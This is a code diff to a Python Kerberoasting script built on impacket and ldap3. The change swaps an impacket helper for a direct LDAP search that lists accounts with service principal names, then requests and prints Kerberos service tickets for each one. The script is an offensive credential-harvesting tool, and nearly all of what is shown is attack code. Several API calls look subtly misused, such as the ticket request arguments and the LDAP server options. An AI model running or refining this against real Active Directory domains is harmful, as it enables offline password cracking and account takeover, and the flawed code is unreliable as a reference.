@@ -1,7 +1,7 @@
 from impacket.smbconnection import SMBConnection
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
 from impacket.krb5.types import Principal
-from impacket.examples.getSPNs import getSPNsForUser
+from ldap3 import Server, Connection, ALL_ATTRIBUTES
 
 def kerberoast(username, password, domain, dc_ip):
     try:
@@ -14,16 +14,26 @@ def kerberoast(username, password, domain, dc_ip):
         if krbtgt_ticket:
             print("Successfully obtained krbtgt ticket.")
             
-            # Get SPNs for the user
-            spns = getSPNsForUser(username, password, domain, dc_ip)
-            if spns:
+            # Query LDAP for user objects with SPN attributes set
+            server = Server(dc_ip, get_info=ALL_ATTRIBUTES)
+            conn = Connection(server, user=username, password=password, authentication='NTLM')
+            conn.bind()
+            conn.search(search_base='DC=' + domain.replace('.', ',DC='),
+                         search_filter='(&(objectClass=user)(servicePrincipalName=*))',
+                         attributes=['sAMAccountName', 'servicePrincipalName'])
+            results = conn.entries
+
+            if results:
                 print("Kerberoastable Accounts:")
-                for spn in spns:
-                    # Kerberoast each account
-                    principal = Principal(spn, type=Principal.NT_PRINCIPAL)
-                    tgs_rep = getKerberosTGS(krbtgt_ticket, principal)
-                    print(f"TGS_REP for {spn}:")
-                    print(tgs_rep.native)
+                for entry in results:
+                    account_name = entry['sAMAccountName'].value
+                    spns = entry['servicePrincipalName'].values
+                    for spn in spns:
+                        # Kerberoast each account
+                        principal = Principal(spn, type=Principal.NT_PRINCIPAL)
+                        tgs_rep = getKerberosTGS(krbtgt_ticket, principal)
+                        print(f"TGS_REP for {account_name} ({spn}):")
+                        print(tgs_rep.native)
             else:
                 print("No kerberoastable accounts found.")
         else:
